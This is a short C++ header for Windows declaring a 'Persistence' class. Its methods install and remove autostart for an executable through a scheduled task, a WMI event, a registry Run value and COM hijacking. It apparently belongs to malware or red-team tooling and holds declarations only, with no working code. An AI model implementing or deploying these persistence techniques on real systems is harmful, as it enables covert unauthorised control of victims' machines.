#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>
#include <string>

using namespace std;

class Persistence
{
private:
    static BOOL CreateScheduledTask(const wstring &taskName, const wstring &exePath);
    static BOOL CreateWMIEvent(const wstring &eventName, const wstring &exePath);
    static BOOL CreateRegistryRun(const wstring &valueName, const wstring &exePath);
    static BOOL CreateCOMHijack(const wstring &exePath);

public:
    static BOOL InstallPersistence(const wstring &exePath);
    static BOOL RemovePersistence();
};

#endif // ADVANCED_PERSISTENCE_H
